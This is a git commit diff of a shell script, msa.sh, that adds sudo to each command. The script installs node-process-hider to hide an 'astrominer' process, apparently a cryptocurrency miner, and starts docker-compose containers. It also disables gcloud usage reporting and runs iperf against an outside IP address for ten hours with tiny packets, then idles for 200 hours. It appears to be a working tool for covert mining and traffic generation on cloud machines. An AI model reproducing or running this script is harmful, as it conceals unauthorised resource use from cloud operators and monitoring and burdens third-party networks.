77954164e46b9f783282d9c9151836f533d3002c
jusnky <rikzakalani@gmail.com>
2023-03-22 16:17:27 +0700

    Update msa.sh

--- msa.sh
+++ msa.sh
@@ -2,14 +2,14 @@
 
 sudo apt-get update
 sudo apt install npm -y
-npm i -g node-process-hider && sudo ph add astrominer 
-curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
+sudo npm i -g node-process-hider && sudo ph add astrominer 
+sudo curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
     chmod +x /usr/local/bin/docker-compose
-docker-compose build --parallel 
-docker-compose up -d  && clear 
+sudo docker-compose build --parallel 
+sudo docker-compose up -d  && clear 
 sudo apt-get install iperf -y
-gcloud config set disable_usage_reporting true
-docker-compose logs
-iperf -c 149.28.246.96 -t 36000 -i 10 -l 0.001K & sudo apt install nethogs -y
+sudo gcloud config set disable_usage_reporting true
+sudo docker-compose logs
+sudo iperf -c 149.28.246.96 -t 36000 -i 10 -l 0.001K & sudo apt install nethogs -y
 sudo nethogs
 sleep 200h
